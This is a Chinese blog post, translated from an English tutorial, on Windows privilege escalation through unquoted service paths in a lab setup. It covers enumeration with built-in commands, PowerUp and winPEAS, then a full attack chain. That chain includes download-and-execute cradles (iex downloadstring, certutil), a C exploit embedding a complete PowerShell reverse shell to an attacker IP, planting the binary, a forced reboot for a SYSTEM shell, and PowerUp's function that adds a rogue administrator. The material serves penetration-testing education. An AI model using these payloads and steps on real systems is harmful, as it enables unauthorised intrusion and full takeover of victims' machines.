
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/kqdssheng/p/18779548" title="发布于 2025-03-19 09:32">
    <span role="heading" aria-level="2">Windows 提权-服务_未引用的服务路径</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/unquoted-service-paths/" target="_blank" rel="noopener nofollow">Unquoted Service Paths – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 id="导航">导航</h2>
<ul>
<li><a href="#id0" rel="noopener nofollow">0 前言</a></li>
<li><a href="#id1" rel="noopener nofollow">1 未引用的服务路径漏洞原理</a></li>
<li><a href="#id2" rel="noopener nofollow">2 搜寻未引用的服务路径</a>
<ul>
<li><a href="#id2.1" rel="noopener nofollow">2.1 枚举未引用的服务路径-手动</a></li>
<li><a href="#id2.2" rel="noopener nofollow">2.2 枚举未引用的服务路径-工具</a>
<ul>
<li><a href="#id2.2.1" rel="noopener nofollow">2.2.1 PowerUp.ps1</a></li>
<li><a href="#id2.2.2" rel="noopener nofollow">2.2.2 winPEAS</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id3" rel="noopener nofollow">3 沿着服务路径枚举目录权限</a>
<ul>
<li><a href="#id3.1" rel="noopener nofollow">3.1 cmd.exe（icacls）</a></li>
<li><a href="#id3.2" rel="noopener nofollow">3.2 PowerShell（Get-ACL）</a></li>
<li><a href="#id3.3" rel="noopener nofollow">3.3 accesschk</a></li>
<li><a href="#id3.4" rel="noopener nofollow">3.4 winPEAS</a></li>
</ul>
</li>
<li><a href="#id4" rel="noopener nofollow">4 自制反向 shell 载荷</a></li>
<li><a href="#id5" rel="noopener nofollow">5 利用未引用的服务路径</a></li>
<li><a href="#id6" rel="noopener nofollow">6 滥用 PowerUp.ps1 功能</a></li>
</ul>
<hr>
<h2 id="0前言"><strong><div id="id0">0、前言</div></strong></h2>
<p>在 Windows 提权技术中，最常见的提权方式是利用服务的错误配置。而服务错误配置的方式有很多，但迄今为止最有趣的还得是服务路径未被引用。在这篇文章中，我们将看到由<strong>薄弱的目录权限</strong>和<strong>带有空格和无引号的服务路径</strong>组合在一起之后是如何使得用户权限从标准用户被提升到了本地 SYSTEM。</p>
<p>首先，我们使用手动技术和自动工具去枚举发现未引用的服务路径。其次，通过进一步枚举，确定我们是否拥有路径中某个目录的写入权限。然后，通过手工自制一个反向 shell 的程序，并在攻击者机器上完成编译。最后，我们会将这个自制程序传输到受害者的特定目录下，并重启系统以获得 SYSTEM shell。</p>
<h2 id="1未引用的服务路径漏洞原理"><strong><div id="id1">1、未引用的服务路径漏洞原理</div></strong></h2>
<p>未加引号的服务路径漏洞是指：当 Windows 在启动服务时，如果服务的可执行文件路径中包含有<strong>空格</strong>，但整个路径又未使用<strong>双引号</strong>包裹。此时，系统便会按照<strong>路径优先级</strong>逐层查找可执行文件。例如：</p>
<p>假设一个服务的路径是 <code>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</code>。此时，Windows 可能会按照以下顺序逐个尝试查找并执行服务启动程序。</p>
<ul>
<li><code>C:\Program.exe</code></li>
<li><code>C:\Program Files\Juggernaut.exe</code></li>
<li><code>C:\Program Files\Juggernaut Prod\Production.exe</code></li>
<li><code>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</code></li>
</ul>
<p>这意味着，如果我们有权限在实际的可执行文件位置之前的三个目录中的任何一个中写入内容，那我们就可以制作一个可执行文件，并根据路径中的名称为其命名，就像上面的例子一样。之后，当服务启动时，它将执行我们的恶意程序，而不是预定的程序。</p>
<p>如果我们可以写入 <code>C:\</code>，我们将制作一个名为 Program.exe 的可执行文件，并将其放入 <code>C:\</code>；如果我们能写入 <code>C:\Program Files</code>，我们就会制作一个名为 Juggernaut.exe 的可执行文件，并将其放入 <code>C:\Program Files</code>。以此类推...</p>
<h2 id="2搜寻未引用的服务路径"><strong><div id="id2">2、搜寻未引用的服务路径</div></strong></h2>
<p>在此示例中，假设我们作为标准用户 cmarko 已在目标机器上获得了立足点。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859317-392698341.png" alt="" loading="lazy"></p>
<p>在获得立足点之后的首要事情便是通过 <code>whoami /priv</code> 命令检查当前用户的特权。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183857750-999129428.png" alt="" loading="lazy"></p>
<p>可以看到用户 cmarko 拥有 SeShutdownPrivilege 权限，而这一点在稍后利用服务获取 SYSTEM shell 时非常重要，因为需要以重启主机的方式重启服务。【因为在大多数情况下，虽然我们有能力滥用服务，但却没有停止和启动服务的权限。而如果服务是自启动的，那我们就可以利用重启机器来重启服务。】</p>
<p>在有了立足点之后，我们就可以利用内置命令手动枚举系统中任何未引用的服务路径，或者也可以利用工具来查找这些错误配置。</p>
<h4 id="21枚举未引用的服务路径-手动"><strong><div id="id2.1">2.1、枚举未引用的服务路径-手动</div></strong></h4>
<p>可以使用 cmd.exe 和 PowerShell 手动查找系统中任何未引用的服务路径。</p>
<p>在 cmd 中的命令如下：</p>
<pre><code class="language-cmd">wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859538-472587447.png" alt="" loading="lazy"></p>
<p>在上述命令中，我们使用 wmic 查询服务并提取了我们感兴趣的信息。同时还使用 findstr 命令过滤掉了以 <code>C:\Windows</code> 开头的目录中的任何结果，因为在这些目录中即便发现了错误配置我们也没有写入权限。而第二个 findstr 命令会筛选任何包含双引号的结果。</p>
<p>在 PowerShell 中的等效命令如下：</p>
<pre><code class="language-powershell">Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858625-1934680609.png" alt="" loading="lazy"></p>
<p>经过上面这两个命令的查询发现，Juggernaut 服务具有未引用的服务路径，并且该服务是自启动服务。</p>
<h4 id="22枚举未引用的服务路径-工具"><strong><div id="id2.2">2.2、枚举未引用的服务路径-工具</div></strong></h4>
<p>有很多后利用工具和脚本可使用，但在本例中，我们将坚持使用 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener nofollow">PowerUp.ps1</a> 和 <a href="https://github.com/carlospolop/PEASS-ng/" target="_blank" rel="noopener nofollow">winPEASx64.exe</a>。</p>
<p>在下载每个工具的副本之后，我们将其转移到受害者机器。</p>
<h6 id="221powerupps1"><strong><div id="id2.2.1">2.2.1、PowerUp.ps1</div></strong></h6>
<p>在此例中，我们先将以下命令附加到 PowerUp.ps1 脚本的底部：</p>
<pre><code class="language-bash">echo 'Invoke-AllChecks' &gt;&gt; PowerUp.ps1
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183900213-1229509018.png" alt="" loading="lazy"></p>
<p>接着，在脚本的当前目录下启动 HTTP 服务器。</p>
<pre><code class="language-bash">python3 -m http.server 80
</code></pre>
<p>然后，使用命令 <code>powershell -ep bypass</code> 进入受害者 shell 上的 PowerShell 会话中，再使用以下命令将 PowerUp.ps1 直接下载到内存中并执行脚本：</p>
<pre><code class="language-powershell">iex(new-object net.webclient).downloadstring('http://172.16.1.30/PowerUp.ps1')
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858116-1238764384.png" alt="" loading="lazy"></p>
<p>在这里，可以看到 PowerUp 能够为我们枚举这种错误配置的服务。此外，PowerUp.ps1 还内置函数可以用来滥用它发现的大多数错误配置。不过，需要指出的是，当 PowerUp 发现一个未引用的服务路径时，并不一定就意味着它是“易受攻击的”，因为 PowerUp 只是识别了错误配置，然后在假定在未引用的服务路径可被利用的情况下提供了一个 AbuseFunction，具体能否利用还是需要自己去判断。【注：滥用操作在本文的<a href="#id6" rel="noopener nofollow">第 6 节</a>讲述】</p>
<h6 id="222winpeas"><strong><div id="id2.2.2">2.2.2、winPEAS</div></strong></h6>
<p>接下来开始 winPEAS 工具的使用，首先需要下载 winPEAS 的副本并传输到受害者机器上。</p>
<pre><code class="language-cmd">certutil -split -f -urlcache "http://172.16.1.30/winPEASx64.exe"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859511-1508523698.png" alt="" loading="lazy"></p>
<p>在受害者机器上执行 winPEAS 之后，会发现 winPEAS 会输出大量的信息让人很容易犯迷糊，因此避免迷糊的关键在于<strong>要清楚我们要找的信息所在的标识位置</strong>。对于未引用的服务路径，我们要检查“<strong>Services Information</strong>”部分。这里会为我们提供有关服务名称、服务启动程序路径和启动类型等信息。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858842-1591822734.png" alt="" loading="lazy"></p>
<p>此外，如果我们继续向下查看 PEAS 的输出结果，就会发现它还枚举了在未引用路径上哪些目录我们具有写入权限。</p>
<blockquote>
<p>毫无疑问，winPEAS 的能力实在是令人难以置信。但是，如果你要从输出的内容中获取到有用的信息的话，还是要多锻炼锻炼。</p>
</blockquote>
<h2 id="3沿着服务路径枚举目录权限"><strong><div id="id3">3、沿着服务路径枚举目录权限</div></strong></h2>
<p>目前，我们已经发现了未引用的服务路径，但仍无法确定它是否真的脆弱。为此，可以使用内置命令 icacls 或 Get-Acl 来检查沿着服务路径上每一层目录的权限，另外，也还会使用外部工具 accesschk.exe 来检查。</p>
<h4 id="31cmdexeicacls"><strong><div id="id3.1">3.1、cmd.exe（icacls）</div></strong></h4>
<p>首先，在 cmd 会话中使用内置命令 icacls 来检查目录和文件的 ACL 的权限。而为了能理解 icacls 命令输出的信息，我们需要了解以下关于权限和用户组相关的知识：</p>
<p>【知识1】：我们要查找的目录权限只要是以下三种权限中的任意一种均可：</p>
<ul>
<li>(F) Full Control【完全控制】</li>
<li>(M) Modify【修改】</li>
<li>(W) Write【写入】</li>
</ul>
<p>【知识2】：我们会经常见到的用户/组如下：</p>
<ul>
<li>当前登录用户，如 bob。</li>
<li>Authenticated Users【注：通过 <strong>控制台、RDP、WinRM、SMB</strong> 登录系统的用户都属于已认证用户。】</li>
<li>Everyone</li>
<li>BUILTIN\Users</li>
<li>NT AUTHORITY\INTERACTIVE</li>
</ul>
<p>接下来，我们打算从左到右开始目录的权限检查，例如：</p>
<pre><code class="language-cmd">icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Juggernaut Prod"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183901527-1801029145.png" alt="" loading="lazy"></p>
<p>可以看到，沿着未引用的文件路径我们找到了可写目录，而这就是可以进行恶意操作的地方！</p>
<p>关于上面的输出内容，这里有三点需要提及一下：</p>
<ul>
<li>第一，我们经常会看到通过身份验证的用户在默认情况下拥有对 <code>C:\</code> 的修改权限。<strong>然而，这其实是一种特殊的高级权限，它实际上只允许在该位置创建子目录，而无法向其中写入可执行文件或任何文件</strong>！【注：普通用户是可以在C盘根目录下创建子目录，然后在子目录中写入文件。】</li>
<li>第二，通常情况下，我们是无法将文件写入 <code>C:\</code> 或 <code>C:\Program Files</code>，但依旧值得去尝试检查一下，万一用户误配置呢。【注：只有<strong>本地管理员组的用户在高完整性 shell</strong> 中才能在这些目录的根下写入文件，注意是写入文件而不是新建目录，因为对于C盘来说新建目录是个例外。】</li>
<li>第三，为什么我们不直接检查路径中的最后一个目录？因为那是包含实际服务启动程序的目录。而如果在那里有写入权限，那这就是<strong>服务的弱权限文件</strong>漏洞了，而不需要使用<strong>未引用的服务路径</strong>来利用它。</li>
</ul>
<p>就简单测试来说，当我们试图将 EXE 文件或 TXT 文件移动或写入到 <code>C:\</code> 时，我们会被提示拒绝访问。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859045-776329412.png" alt="" loading="lazy"></p>
<h4 id="32powershellget-acl"><strong><div id="id3.2">3.2、PowerShell（Get-ACL）</div></strong></h4>
<p>也可以在 PowerShell 会话中使用以下命令执行相同的枚举：</p>
<pre><code class="language-powershell">Get-Acl -Path C:\ | Format-List
Get-Acl -Path "C:\Program Files" | Format-List
Get-Acl -Path "C:\Program Files\Juggernaut Prod" | Format-List
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858422-1903823004.png" alt="" loading="lazy"></p>
<p>在上面我们可以看到，它并没有像 icacls 那样在 <code>C:\</code> 上显示“Modify”。相反，它提供了 "访问掩码格式"，上面的数字其实也就是 “Modify”的数字表示形式。</p>
<blockquote>
<p>注：<code>Get-Acl -Path C:\ | Format-List</code>和 <code>Get-Acl -Path C: | Format-List</code> 输出的结果还是有所不同。主要是由于 <code>C:\</code> 和 <code>C:</code> 在 Windows 文件系统中有着不同的语义，<code>C:\</code> 代表完整的根目录路径，而 <code>C:</code>  仅表示 C 盘当前所在的活动工作目录，一般是 <code>C:\Users\YourName</code>，但也不绝对。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183904686-470751249.png" alt="" loading="lazy"></p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183900418-1106170547.png" alt="" loading="lazy"></p>
<h4 id="33accesschk"><strong><div id="id3.3">3.3、accesschk</div></strong></h4>
<p>接下来，使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener nofollow">Sysinternals</a> 工具套件的 Accesschk64.exe 工具来对目录权限进行查看。</p>
<p>将 accesschk64.exe 的副本下载并传输到受害者机器上。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859308-1298300593.png" alt="" loading="lazy"></p>
<p>然后使用以下命令来枚举相同的目录：</p>
<pre><code class="language-cmd">.\accesschk64.exe -wvud "C:\" -accepteula
.\accesschk64.exe -wvud "C:\Program Files" -accepteula
.\accesschk64.exe -wvud "C:\Program Files\Juggernaut Prod" -accepteula
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858859-73777390.png" alt="" loading="lazy"></p>
<p>从上面可以看到，accesschk 为我们提供了关于 <code>C:\</code> 目录上最准确的权限说明，即 <strong>当前用户虽然拥有 W 写访问权限，但实际仅限于创建文件夹</strong> (FILE_ADD_SUBDIRECTORY)。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859687-1846654487.png" alt="" loading="lazy"></p>
<p>由于当前用户不能在 <code>C:\Program Files</code> 目录中写入文件， 再加上 accesschk64.exe -w 选项只过滤写访问的原因，所以在上面的输出中我们并不能看到有关标准用户的任何结果。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183901544-101861378.png" alt="" loading="lazy"></p>
<p>最后，在上面可以看到，标准用户拥有大量的 FILE_WRITE 和 FILE_ADD 权限，但并没有显示“完全访问”。这可以推断为修改权限。</p>
<h4 id="34winpeas"><strong><div id="id3.4">3.4、winPEAS</div></strong></h4>
<p>之前在使用 winPEAS 时，看到“Service Information”部分有一个未引用的服务路径。</p>
<p>从那里开始继续向下滚动到“Application Information”部分，然后检查“Installed Applications”子部分。如果我们能够利用该服务，那么就能从这里找到拥有写入权限的未引用服务路径中的那个目录。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183902916-1642696331.png" alt="" loading="lazy"></p>
<p>如果在这部分中没有找到与我们发现的未引用服务路径相关联的可写目录，那么我们很可能也无法利用该服务。如果出现了这种情况，那么在彻底排除这一发现之前，仍应继续使用上述其它的手动方法继续确认，以防误报。</p>
<h2 id="4自制反向-shell-载荷"><strong><div id="id4">4、自制反向 shell 载荷</div></strong></h2>
<p>截至目前，我们发现的信息有：</p>
<ul>
<li>有一个服务存在未引用的服务路径，路径是 <code>C:\Program Files\Juggernaut Prod\Production Tools\Juggernaut.exe</code>。</li>
<li>该服务是开机自启动服务，且当前用户具有 SeShutdown 特权。</li>
<li>当前用户可以在 <code>C:\Program Files\Juggernaut Prod\</code> 目录写入文件。</li>
</ul>
<p>这种权限升级技术的下一步便是制作一个自定义漏洞利用程序，并将其放在 <code>C:\Program Files\Juggernaut Prod\</code> 中。为此，我制作了一个自定义可执行文件，它可以在攻击者的机器上直接编译。</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

int main(){ 
    system("whoami &gt;&gt; C:\\temp\\whoami.txt");
    return 0; 
}
</code></pre>
<p>可以看到，我们的可执行文件将运行 whoami 命令，并将输出结果重定向到一个文件。虽然这是一个很酷的 POC，但我们真正想要的是一个反向 shell。</p>
<p>为此，让我们编辑此脚本中的 whoami 命令并将其替换为下面的 PowerShell 1-liner 命令，这样就能在执行该命令时获得一个反向 shell：</p>
<pre><code class="language-powershell">"powershell.exe -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('172.16.1.30',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
</code></pre>
<blockquote>
<p>注：脚本中的 IP 为攻击者机器的 IP 地址。</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859830-862122319.png" alt="" loading="lazy"></p>
<blockquote>
<p>请注意，上述的 PowerShell 命令周围的双引号旁边的转义字符是需要存在的。这是为了让代码将它们读作字面上的双引号，因为如果没有双引号，代码将无法编译，或者即使编译了也无法运行。</p>
</blockquote>
<p>现在 exploit.c 文件可以编译了，可以使用 mingw-w64 或以下命令直接在攻击者机器上编译它：</p>
<pre><code class="language-bash">x86_64-w64-mingw32-gcc exploit.c -o Production.exe
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859314-1523588981.png" alt="" loading="lazy"></p>
<p>编译完成之后便可将恶意程序传输到受害者机器。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859182-569794198.png" alt="" loading="lazy"></p>
<h2 id="5利用未引用的服务路径"><strong><div id="id5">5、利用未引用的服务路径</div></strong></h2>
<p>接下来，只需将漏洞利用程序移到 <code>"C:\Program Files\Juggernaut Prod "</code> 目录中，然后在攻击者机器上启动 443 端口的 netcat 监听器，最后重启受害者机器即可。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859137-1998423667.png" alt="" loading="lazy"></p>
<p>重新启动计算机可以使用以下命令：</p>
<pre><code class="language-cmd">shutdown /r /t 0 /f
</code></pre>
<p>回到监听器，我们就得到了一个 SYSTEM shell！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183900023-1225082989.png" alt="" loading="lazy"></p>
<blockquote>
<p>有时候在回到监听器的时候发现好像并没有发生什么变化，也没有出现任何提示，这时只需按下回车键，提示就会出现。</p>
</blockquote>
<h2 id="6滥用-powerupps1-功能"><strong><div id="id6">6、滥用 PowerUp.ps1 功能</div></strong></h2>
<p>之前在 <a href="#id2.2.1" rel="noopener nofollow">2.2.1 小节</a>的时候，当我们使用 PowerUp.ps1 枚举未引用的服务路径时，它显示有 AbuseFunction (滥用)字段。现在，我们可以用它来利用这个漏洞。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858602-1402272221.png" alt="" loading="lazy"></p>
<p>使用此 AbuseFunction 将会在当前目录下创建一个恶意程序，而运行该程序将会创建一个新用户，并将该用户归入管理员组。【注：以当前普通用户的身份单独执行该程序是不起作用的。】</p>
<pre><code class="language-powershell">Write-ServiceBinary -ServiceName 'Juggernaut'
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183858959-628069771.png" alt="" loading="lazy"></p>
<p>此时，我们需要将上述生成 service.exe 程序写入 <code>"C:\Program Files\Juggernaut Prod"</code> ，然后将其重命名为 Production.exe。</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859681-602286324.png" alt="" loading="lazy"></p>
<p>现在，当我们重启系统并回到之前的反向 shell 时，可以看到新的用户已创建并被添加到了本地管理员组！</p>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183859565-1063391540.png" alt="" loading="lazy"></p>
<p>此时，如果很幸运发现目标系统的 RDP 服务是打开的，那我们就可以使用 xfreerdp 进行 RDP 登录，然后以“以管理员身份运行”打开 cmd，进入到具有完全权限的高完整性 shell 中。</p>
<pre><code class="language-bash">sudo xfreerdp /u:john /p:'Password123!' /v:172.16.1.50 +clipboard
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250318183900404-204936772.png" alt="" loading="lazy"></p>
<p>但是，如果目标没有打开 RDP 服务。此时，我们就需要通过 <a href="https://www.cnblogs.com/kqdssheng/p/18751119" target="_blank">Runas</a> 和 <a href="https://www.cnblogs.com/kqdssheng/p/18745249" target="_blank">UAC-bypass</a> 技术来获取管理员高完整性 shell。</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.054975512056712965" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-03-19 09:54">2025-03-19 09:32</span>&nbsp;
<a href="https://www.cnblogs.com/kqdssheng">扛枪的书生</a>&nbsp;
阅读(<span id="post_view_count">15</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18779548" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18779548);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18779548', targetLink: 'https://www.cnblogs.com/kqdssheng/p/18779548', title: 'Windows 提权-服务_未引用的服务路径' })">举报</a>
</div>
        